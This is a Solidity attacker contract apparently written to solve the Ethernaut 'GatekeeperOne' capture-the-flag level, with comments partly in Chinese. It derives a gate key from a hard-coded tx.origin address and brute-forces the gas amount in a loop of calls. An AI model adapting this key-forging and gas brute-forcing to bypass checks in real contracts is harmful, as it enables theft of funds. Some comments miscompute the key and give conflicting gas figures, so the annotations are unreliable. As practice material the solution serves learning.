// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttacker {
    address public gatekeeperOneAddress;
    bytes8 public gateKey;
    uint256 public gasOffset = 0; // 神秘數字是 423
    bool public result = false;
    uint256 public looptime = 0;

    constructor(address _gatekeeperOneAddress) {
        gatekeeperOneAddress = _gatekeeperOneAddress;
        // Set the gateKey to a value that satisfies the conditions of gateThree
        // The value should be 0x000000000000FFFF to satisfy the uint32 and uint16 conditions
        // gateKey = 0x000000000000FFFF;  // uint64
        // gateKey = _gateKey; 
        // 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6 tx.origin
        // 0x5df6 == uint16(uint160(tx.origin)
        // gateKey = 0x0000000000005d6f == uint64(_gateKey)
        // 0x00005d6f == uint32(uint64(_gateKey))
        // 遮罩 = 0xffffffff0000ffff
        // 得出 gateKey 可以 = 0x0100000000005d6f
        gateKey = 0x0000000100005df6;
        // gateKey = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
    }

    function attack(uint64 gasToUse) public {
        // Call the enter function of GatekeeperOne with the gateKey
        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 500; i++){
            (result, ) = gatekeeperOneAddress.call{gas: gasToUse + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (result) {
                // 神秘數字是256
                gasOffset = i;
                result = true;
                break;
            } else {
                looptime += 1;
                continue;
            }
        }
        // require(success, "Attack failed");
    }
}